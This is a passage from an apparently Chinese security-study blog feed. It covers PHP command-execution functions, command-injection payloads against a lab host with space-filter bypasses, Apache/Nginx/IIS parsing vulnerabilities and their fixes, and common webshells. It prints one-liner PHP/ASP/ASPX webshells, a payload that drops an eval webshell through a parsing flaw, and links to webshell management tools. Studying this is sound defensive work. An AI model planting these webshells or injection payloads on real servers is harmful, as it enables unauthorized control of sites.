时，不能使用此函数。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ls -lart&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a><code>popen()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">popen</span> ( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">string</span> <span class="variable">$mode</span> )</span><br></pre></td></tr></table></figure><blockquote><p>打开进程文件指针，打开一个指向进程的管道，该进程由派生给定的 <code>command</code> 命令执行而产生。只能打开单向管道，不是’r’就是’w’；并且需要使用 <code>pclose()</code> 来关闭。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fd</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&quot;whoami&quot;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fd</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line"><span class="comment">// $fd = popen(&quot;systeminfo &gt; D:\\1.txt&quot;, &#x27;r&#x27;);</span></span><br><span class="line"><span class="comment">// pclose($fd);</span></span><br><span class="line"><span class="comment">// print(fgets(fopen(&quot;d:\\1.txt&quot;,&#x27;r&#x27;)));</span></span><br><span class="line"><span class="comment">// $handle = fopen(&quot;D:\\1.txt&quot;, &quot;r&quot;);</span></span><br><span class="line"><span class="comment">// $contents = fread($handle, 100000);</span></span><br><span class="line"><span class="comment">// fclose($handle);</span></span><br><span class="line"><span class="comment">// echo &quot;&lt;pre&gt;$contents&lt;/pre&gt;&quot;;</span></span><br><span class="line"><span class="comment">// $fd = popen(&quot;ipconfig&quot;,&#x27;r&#x27;);</span></span><br><span class="line"><span class="comment">// while($s=fgets($fd))&#123;</span></span><br><span class="line"><span class="comment">//  echo &quot;&lt;pre&gt;$s&lt;/pre&gt;&quot;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="windows-com对象"><a href="#windows-com对象" class="headerlink" title="windows com对象"></a><code>windows com</code>对象</h3><p><code>COM</code>即组件对象模型，是<code>Component Object Model</code>取前三个字母的缩写，这三个字母在当今Windows的世界中随处可见。随时涌现出来的大把大把的新技术都以<code>COM</code>为基础。各种文档中也充斥着诸如<code>COM</code>对象、接口、服务器之类的术语。因此，对于一个程序员来说，不仅要掌握使用COM的方法，而且还要彻底熟悉<code>COM</code>的所有一切。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$command</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>); <span class="comment">// 生成一个COM对象 Shell.Application也能</span></span><br><span class="line"><span class="variable">$exec</span> = <span class="variable">$wsh</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;cmd /c&quot;</span>.<span class="variable">$command</span>); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line"><span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line"><span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="命令执行常用特殊字符（并行执行两条命令）"><a href="#命令执行常用特殊字符（并行执行两条命令）" class="headerlink" title="命令执行常用特殊字符（并行执行两条命令）"></a>命令执行常用特殊字符（并行执行两条命令）</h2><ul><li><code>cmd1|cmd2</code>：无论<code>cmd1</code>是否执行成功，<code>cmd2</code>将被执行</li><li><code>cmd1;cmd2</code>：无论<code>cmd1</code>是否执行成功，<code>cmd2</code>将被执行</li><li><code>cmd1||cmd2</code>：仅在<code>cmd1</code>执行失败时才执行<code>cmd2</code>，执行正确时就只显示<code>cmd1</code></li><li><code>cmd1&amp;&amp;cmd2</code>：仅在<code>cmd1</code>执行成功后时才执行<code>cmd2</code></li><li><code>$(cmd)</code> ：如：<code>echo $(whoami)</code> 或者 <code>$(touch test.sh; echo &#39;ls&#39; &gt; test.sh)</code></li><li><code>&#39;cmd&#39;</code>：用于执行特定命令，如 <code>&#39;whoami&#39;</code></li><li><code>&gt;(cmd)：&lt;(ls)</code></li><li><code>&lt;(cmd)：&gt;(ls)</code>——————————————不是很懂这个地方什么意思</li></ul><blockquote><p>注意：Linux中使用<code>$</code>符号来执行命令，在Linux终端中，输入<code>$(whoami)</code>，意思就是相当于我们在Linux输入<code>whoami</code>一样</p></blockquote><h2 id="其他PHP危险函数"><a href="#其他PHP危险函数" class="headerlink" title="其他PHP危险函数"></a>其他PHP危险函数</h2><h3 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h3><ul><li><code>require()</code></li><li><code>include()</code></li><li><code>require_once()</code></li><li><code>include_once()</code></li></ul><h3 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h3><ul><li><code>copy()</code>————————拷贝文件</li><li><code>file_get_contents()</code>———将整个文件读入一个字符串</li><li><code>file_put_contents()</code>———将一个字符串写入文件</li><li><code>file()</code>—————————-把整个文件读入一个数组中</li><li><code>fopen()</code>————————打开文件或者url</li><li><code>move_uploaded_file()</code>—-将上传的文件移动到新位置</li><li><code>readfile()</code>———————-输出文件</li><li><code>rename()</code>———————重命名一个文件或目录</li><li><code>rmdir()</code>————————删除目录</li><li><code>unlink &amp; delete()</code>———–删除文件</li></ul><h1 id="命令执行漏洞利用练习"><a href="#命令执行漏洞利用练习" class="headerlink" title="命令执行漏洞利用练习"></a>命令执行漏洞利用练习</h1><h2 id="命令执行例1"><a href="#命令执行例1" class="headerlink" title="命令执行例1"></a>命令执行例1</h2><blockquote><p><a href="http://120.27.61.239:8008/source/index10.php">http://120.27.61.239:8008/source/index10.php</a></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">未对用户输入的参数ip做任何过滤。</span><br><span class="line">构造payload：</span><br><span class="line">127.0.0.1&amp;&amp;whoami</span><br><span class="line">127.0.0.1;whoami</span><br><span class="line">127.0.0.1|whoami</span><br><span class="line">test||whoami</span><br><span class="line">test&amp;whoami</span><br></pre></td></tr></table></figure><h2 id="命令执行例2"><a href="#命令执行例2" class="headerlink" title="命令执行例2"></a>命令执行例2</h2><blockquote><p><a href="http://120.27.61.239:8008/source/index11.php">http://120.27.61.239:8008/source/index11.php</a></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">黑名单机制。简单替换输入数据中的 &amp;&amp; 和 ; 为空</span><br><span class="line">黑名单机制时有缺陷，因为不可能枚举出所有的特殊连接命令字符</span><br><span class="line">构造payload：</span><br><span class="line">127.0.0.1&amp;;&amp;whoami</span><br><span class="line">127.0.0.1|whoami</span><br><span class="line">test||whoami</span><br><span class="line">test|;|whoami</span><br><span class="line">test&amp;whoami</span><br><span class="line"></span><br><span class="line">在Linux中执行命令就需要使用空格，但是如果空格被过滤了呢？？？</span><br><span class="line">那么我们便需要绕过空格</span><br><span class="line">Linux shell中绕过空格：</span><br><span class="line">&lt; 、&lt;&gt;、$IFS$9、$&#123;IFS&#125;、$IFS、$IFS[*]、$IFS[@]等</span><br><span class="line"></span><br><span class="line">root@VM-16-6-ubuntu:~# echo 123 &gt; 1.txt</span><br><span class="line">root@VM-16-6-ubuntu:~# cat 1.txt</span><br><span class="line">123</span><br><span class="line">root@VM-16-6-ubuntu:~# cat&lt;1.txt</span><br><span class="line">123</span><br><span class="line">root@VM-16-6-ubuntu:~# cat$IFS$91.txt</span><br><span class="line">123</span><br><span class="line">root@VM-16-6-ubuntu:~#</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211142042350.png" alt="image-20221114204202930" style="zoom:50%;" /><h2 id="命令执行例3"><a href="#命令执行例3" class="headerlink" title="命令执行例3"></a>命令执行例3</h2><blockquote><p><a href="http://120.27.61.239:8008/source/index12.php">http://120.27.61.239:8008/source/index12.php</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">比较严格的黑名单机制；</span><br><span class="line">未过滤特殊字符：&quot;|&quot;。</span><br><span class="line">构造payload：</span><br><span class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="反弹Shell简介"><a href="#反弹Shell简介" class="headerlink" title="反弹Shell简介"></a>反弹Shell简介</h2><h3 id="什么是正向shell"><a href="#什么是正向shell" class="headerlink" title="什么是正向shell"></a>什么是正向shell</h3><blockquote><p>正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。</p></blockquote><h3 id="什么是反向shell"><a href="#什么是反向shell" class="headerlink" title="什么是反向shell"></a>什么是反向shell</h3><blockquote><p>反向shell（反弹shell）：被控端主动发起连接请求去连接控制端。通常被控端由于防火墙限制、权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包，导致正向shell连不上，只能使用反向shell连接被控端</p></blockquote><h2 id="Linux反弹shell"><a href="#Linux反弹shell" class="headerlink" title="Linux反弹shell"></a>Linux反弹shell</h2><blockquote></blockquote><h2 id="Windows反弹shell"><a href="#Windows反弹shell" class="headerlink" title="Windows反弹shell"></a>Windows反弹shell</h2><blockquote></blockquote><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://bealright.github.io/2019/08/10/DVWA%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">DVWA——命令执行漏洞学习 · Lemon’s blog (bealright.github.io)</a></li><li><a href="https://blog.csdn.net/qq_43431158/article/details/99673451">PHP危险函数总结_lemonl1的博客-CSDN博客_php命令执行的危险函数</a></li><li><a href="https://blog.csdn.net/qq_42804678/article/details/91346116">正则里的(.<em>?)是什么意思_Pikachu_simple的博客-CSDN博客_正则</em>?</a></li><li><a href="https://blog.csdn.net/weixin_34315189/article/details/94527200">正则表达式贪婪性—点星（.*） 20190618_weixin_34315189的博客-CSDN博客</a></li><li><a href="https://blog.csdn.net/weixin_43749601/article/details/113417093">preg_replace() &#x2F;e代码执行漏洞_2021！的博客-CSDN博客</a></li><li><a href="https://www.w3schools.cn/php/php_regex.asp#:~:text=">PHP 正则表达式 (w3schools.cn)</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> 命令执行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见中间件解析漏洞</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>解析漏洞并不常见</p><p>解析漏洞是指web服务器因对http请求处理不当导致将非可执行的脚本，文件等当做可执行的脚本、文件等执行。</p><p>该漏洞一般配合服务器的<strong>文件上传</strong>功能使用，以获取服务器的权限。</p><h1 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h1><h2 id="Apache-多后缀解析漏洞"><a href="#Apache-多后缀解析漏洞" class="headerlink" title="Apache 多后缀解析漏洞"></a>Apache 多后缀解析漏洞</h2><p>形式： <code>test.php.qwe.asd</code> ，任意不属于Apache解析黑名单且也不属于白名单的名称</p><p>原理：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 <code>test.php.qwe.asd</code> ，”.<code>qwe</code>“和”<code>.asd</code>“ 这两种后缀是apache不可识别解析，apache就会把<code>test.php.qwe.asd</code> 解析成php。</p><p>条件：apache通过<code>mod_php</code>来运行脚本，其<code>2.4.0-2.4.29</code>中存在<strong>apache换行解析漏洞</strong>，在解析php时<code>xxx.php\x0A</code> 将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略</p><p><strong>其余配置问题导致漏洞</strong>：</p><blockquote><ul><li>如果在 Apache 的 <code>conf</code> 里有这样一行配置 <code>AddHandler php5-script .php</code> 这时只要文件名里包含.php 即使文件名是 <code>test2.php.jpg</code> 也会以 php 来执行。 </li><li>如果在 Apache 的 <code>conf</code> 里有这样一行配置 <code>AddType application/x-httpd-php .jpg</code> 即使扩展名是 jpg，一样能以 php 方式执行。</li></ul></blockquote><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ol><li>apache配置文件，禁止.php.这样的文件执行，配置文件(<code>C:\phpstudy\Apache\conf\httpd.conf</code>)里面加入</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.(php.|php3.|php4.|php5.)&quot;&gt;</span><br><span class="line"></span><br><span class="line">  Order Deny,Allow</span><br><span class="line"></span><br><span class="line">  Deny from all</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>用伪静态能解决这个问题，重写类似<code>.php.*</code>这类文件，打开apache的<code>httpd.conf</code>找到<code>LoadModule rewrite_module modules/mod_rewrite.so</code>。</p><p>把#号去掉，重启apache，在网站根目录下建立<code>.htaccess</code>文件,代码如下:</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line"></span><br><span class="line">RewriteEngine On</span><br><span class="line"></span><br><span class="line">RewriteRule .(php.|php3.) /index.php</span><br><span class="line"></span><br><span class="line">RewriteRule .(pHp.|pHp3.) /index.php</span><br><span class="line"></span><br><span class="line">RewriteRule .(phP.|phP3.) /index.php</span><br><span class="line"></span><br><span class="line">RewriteRule .(Php.|Php3.) /index.php</span><br><span class="line"></span><br><span class="line">RewriteRule .(PHp.|PHp3.) /index.php</span><br><span class="line"></span><br><span class="line">RewriteRule .(PhP.|PhP3.) /index.php</span><br><span class="line"></span><br><span class="line">RewriteRule .(pHP.|pHP3.) /index.php</span><br><span class="line"></span><br><span class="line">RewriteRule .(PHP.|PHP3.) /index.php</span><br><span class="line"></span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure><h1 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h1><p>形式： <code>任意文件名/任意文件名.php</code></p><p>一个在任意文件名后面添加  &#x2F;任意文件名.php   的解析漏洞，比如原本文件名是 <code>test.jpg</code> ，可以添加为 <code>test.jpg/x.php</code>  进行解析攻击。</p><blockquote><p>其他形式：</p><p><code>www.xxxx.com/UploadFiles/image/1.jpg/1.php</code><br><code>www.xxxx.com/UploadFiles/image/1.jpg.php</code><br><code>www.xxxx.com/UploadFiles/image/1.jpg/ \0.php</code></p></blockquote><p>版本： <code>Nginx &lt; 0.8.37</code></p><p>原理：开启了<strong>fix_pathinfo</strong>这个设置选项，导致的漏洞，IIS 7.0和IIS 7.5也是因为这个产生的解析漏洞</p><p>默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置<code>SCRIPT_FILENAME</code> 。当访问<code>www.xx.com/phpinfo.jpg/1.php</code> 这个URL时，<code>$fastcgi_script_name</code> 会被设置为 <code>phpinfo.jpg/1.php</code> ，然后构造成 <code>SCRIPT_FILENAME</code> 传递给<code>PHPCGI</code>。</p><p>但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?</p><p>这就要说到<code>fix_pathinfo</code> 这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑： </p><p>PHP会认为<code>SCRIPT_FILENAME</code> 是 <code>phpinfo.jpg</code> ，而 <code>1.php</code> 是 <code>PATH_INFO</code> ，所以就会将 <code>phpinfo.jpg</code> 作为PHP文件来解析了</p><h2 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h2><ol><li>修改<code>php.ini</code>文件，将<code>cgi.fix_pathinfo</code>的值设置为0;</li><li>在Nginx配置文件中添加以下代码：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( $fastcgi_script_name ~ ..*/.*php ) &#123;</span><br><span class="line"></span><br><span class="line">return 403;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这行代码的意思是当匹配到类似test.jpg&#x2F;a.php的URL时，将返回403错误代码。</p></blockquote><h1 id="Nginx-空字节代码执行漏洞"><a href="#Nginx-空字节代码执行漏洞" class="headerlink" title="Nginx 空字节代码执行漏洞"></a>Nginx 空字节代码执行漏洞</h1><p>形式： <code>任意文件名%00.php</code></p><p>对低版本的 Nginx 可以在任意文件名后面添加 <code>%00.php</code> 进行解析攻击。 Nginx在图片中嵌入PHP代码然后通过访问 <code>xxx.jpg%00.php</code> 来执行其中的代码</p><p>版本：<code>0.5.,0.6., 0.7</code> &lt;&#x3D; <code>0.7.65, 0.8</code> &lt;&#x3D; <code>0.8.37</code></p><h1 id="IIS-6-0-解析漏洞"><a href="#IIS-6-0-解析漏洞" class="headerlink" title="IIS 6.0 解析漏洞"></a>IIS 6.0 解析漏洞</h1><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p><blockquote><p>IIS6.0 默认的可执行文件除了asp还包含这三种 :</p><blockquote><p><code>/test.asa</code> </p><p><code>/test.cer</code> </p><p><code>/test.cdx</code></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211131642865.png" alt="img" style="zoom:50%;" /></blockquote><h2 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h2><blockquote><p><strong>目录解析漏洞基本通杀所有的windows</strong></p></blockquote><p>形式： <code>www.xxx.com/xx.asp/xx.jpg</code></p><p>原理: 服务器默认会把 <code>.asp</code> 目录下的文件都解析成<code>asp</code>文件。</p><h2 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h2><p>形式： <code>www.xxx.com/xx.asp;.jpg</code></p><p>原理：服务器默认不解析<code>;</code>号后面的内容，因此 <code>xx.asp;.jpg</code> 便被解析成<code>asp</code>文件了。</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ol><li>目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传<code>xx.asp;.jpg</code>类型的文件名。</li><li>做好权限设置，限制用户创建文件夹。</li></ol><h1 id="IIS-7-0-x2F-7-5-解析漏洞"><a href="#IIS-7-0-x2F-7-5-解析漏洞" class="headerlink" title="IIS 7.0&#x2F;7.5 解析漏洞"></a>IIS 7.0&#x2F;7.5 解析漏洞</h1><blockquote><p>和上面<code>Ngnix  0.8.3</code>这个漏洞很像~~~基本上就是一样的</p></blockquote><p>形式： <code>任意文件名/任意文件名.php</code></p><p>版本： <code>IIS7.0/7.5</code></p><p>原理： 和上面Ngnix一样。对任意文件名只要在 URL后面追加上<code>字符串 /任意文件名.php</code> 就会按照 php 的方式去解析。同样，这是由于php配置文件中，开启了 <code>cgi.fix_pathinfo</code>选项 ，而这并不是nginx或者iis7.5本身的漏洞，是配置不当引发的解析漏洞。</p><blockquote><p>注：在进行实际的测试的时候，发现漏洞并没有产生，后来发现要设置<strong>FastCGI为关闭</strong>，该项好像是用来处理数据文件</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211131704101.png" alt="img" style="zoom:67%;" /></blockquote><p>高级玩法：</p><p>在默认<strong>Fast-CGI开启状况</strong>下，上传一个名字为<code>sp.jpg</code>，内容为</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?<span class="variable constant_">PHP</span> <span class="title function_">fputs</span>(<span class="title function_">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure><p>的文件，然后访问<code>sp.jpg/.php</code>,在这个目录下就会生成一句话木马 <code>shell.php</code></p><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://cloud.tencent.com/developer/article/1684589">中间件的解析漏洞详解及演示 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></li><li><a href="https://www.cnblogs.com/milantgh/p/4347520.html">IIS6.0文件解析漏洞小结 - milantgh - 博客园 (cnblogs.com)</a></li><li><a href="https://www.cnblogs.com/1996-11-01-614lb/p/14237744.html">中间件解析漏洞 - 兰博~~ - 博客园 (cnblogs.com)</a></li><li><a href="https://www.freebuf.com/vuls/336862.html">Apache两个解析漏洞复现及防御方法 - FreeBuf网络安全行业门户</a></li></ul></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> 历史漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 历史漏洞 </tag>
            
            <tag> Apache </tag>
            
            <tag> 中间件漏洞 </tag>
            
            <tag> Nginx </tag>
            
            <tag> IIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见Webshell</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E5%B8%B8%E8%A7%81Webshell.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E5%B8%B8%E8%A7%81Webshell.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Webshell</p><h1 id="Webshell简介"><a href="#Webshell简介" class="headerlink" title="Webshell简介"></a>Webshell简介</h1><p>WebShell就是以ASP、PHP、JSP或者CGI等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</p><h1 id="常用一句话Webshell"><a href="#常用一句话Webshell" class="headerlink" title="常用一句话Webshell"></a>常用一句话Webshell</h1><h2 id="基础版"><a href="#基础版" class="headerlink" title="基础版"></a>基础版</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php一句话木马： &lt;?php @eval($_POST[value]);?&gt;</span><br><span class="line">asp一句话木马： &lt;%eval request(&quot;value&quot;)%&gt;</span><br><span class="line">aspx一句话木马： &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br></pre></td></tr></table></figure><h1 id="Webshell原理"><a href="#Webshell原理" class="headerlink" title="Webshell原理"></a>Webshell原理</h1><p>以一个原始而又简单的php一句话木马为例：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    @eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>要点解释：</strong></p><ul><li><p>php的代码要写在 <?php ?> 里面，服务器才能认出来这是php代码，然后才去解析php的内容。</p></li><li><p><code>@</code> 符号的意思是不报错，因为cmd这个变量没有定义而被直接使用，服务器会提醒cmd变量未定义。</p></li><li><p><code>$_POST[&#39;cmd&#39;];</code>的解释：</p><p>php里面有几个超全局变量， <code>$_GET、$_POST</code> 就是其中之一，意思是用 post的方法接收变量cmd传递来的字符。</p><p>比如<code>$_POST[&#39;cmd&#39;]</code>接受到<code>cmd=echo 123</code>，则代码就相当于：<code>&lt;?php @eval(echo 123)?&gt;</code></p></li><li><p><strong>php危险函数</strong>：</p><blockquote><ul><li><code>eval()</code>：把字符串作为PHP代码执行</li><li><code>exec()</code>： 执行一个外部程序</li><li><code>system()</code>：执行外部程序，并且显示输出</li></ul></blockquote></li><li><p>如上所述：<code>eval()</code>函数可以将一个字符串当作php的代码执行~~~，于是</p><p>这串代码<code>&lt;?php @eval(echo 123)?&gt;</code>等价于&#x3D;&#x3D;&#x3D;&#x3D;&gt;<code>&lt;?php echo 123?&gt;</code></p><p>相当于就是通过php执行了一条php的代码命令：<code>echo 123</code></p></li></ul><h1 id="利用Webshell做更多事情"><a href="#利用Webshell做更多事情" class="headerlink" title="利用Webshell做更多事情"></a>利用Webshell做更多事情</h1><h2 id="验证webshell是否上传成功"><a href="#验证webshell是否上传成功" class="headerlink" title="验证webshell是否上传成功"></a>验证webshell是否上传成功</h2><p>上传的webshell要有效果的话必须要要满足两个条件，<strong>php语法</strong>和<strong>php文件的后缀</strong>（不然就只有解析漏洞存在时才有机会），即上传的php文件内容是 <code>&lt;?php @eval($_POST[value]);?&gt;</code>类似这种可以被php解析的代码。</p><p>但是一般php类型的文件会被各种服务端拦截方式拦截下来，绕过的话，可以参考另一篇文件上传的文章~~</p><p>文件上传后在相应目录下访问即可证明上传成功，不多赘述</p><h2 id="在hackbar-post进行传入cmd命令"><a href="#在hackbar-post进行传入cmd命令" class="headerlink" title="在hackbar post进行传入cmd命令"></a>在hackbar post进行传入cmd命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd=system(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure><ul><li>注意php代码以分号结尾</li><li>这里使用了命令执行的危险函数：<code>system()</code>;可以通过php执行系统命令~~</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211131417972.png" alt="image-20221113141706676" style="zoom:33%;" /><h2 id="Webshell工具连接Webshell"><a href="#Webshell工具连接Webshell" class="headerlink" title="Webshell工具连接Webshell"></a>Webshell工具连接Webshell</h2><blockquote><p>蚁剑、哥斯拉什么的</p></blockquote><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cknife：（PPT文件夹有编译好的exe程序） </span><br><span class="line">https://github.com/Chora10/Cknife</span><br><span class="line">中国菜刀：</span><br><span class="line">https://github.com/raddyfiy/caidao-official-version</span><br></pre></td></tr></table></figure><h3 id="蚁剑-AntSword"><a href="#蚁剑-AntSword" class="headerlink" title="蚁剑-AntSword"></a>蚁剑-AntSword</h3><blockquote><p>能生成免杀shell</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 下载 AntSword-Loader  </span><br><span class="line">https://github.com/AntSwordProject/AntSword-Loader/releases</span><br><span class="line">2. 下载 antSword  </span><br><span class="line">https://github.com/AntSwordProject/antSword/releases</span><br><span class="line">3. 解压并进入 AntSword-Loader 目录，新建work目录，解压 antSword  到 work  目录</span><br></pre></td></tr></table></figure><h3 id="冰蝎-Behinder"><a href="#冰蝎-Behinder" class="headerlink" title="冰蝎-Behinder"></a>冰蝎-Behinder</h3><blockquote><p>有流量动态加密</p><p>冰蝎对上传的webshell有要求 具体要求要自己去了解</p><p>要上传冰蝎的shell，才可以连上冰蝎</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Behinder：</span><br><span class="line">https://github.com/rebeyond/Behinder/releases</span><br></pre></td></tr></table></figure><h3 id="哥斯拉-Godzilla"><a href="#哥斯拉-Godzilla" class="headerlink" title="哥斯拉-Godzilla"></a>哥斯拉-Godzilla</h3><blockquote><p>有生成脚本的功能，要使用生成的脚本连接</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Godzilla：</span><br><span 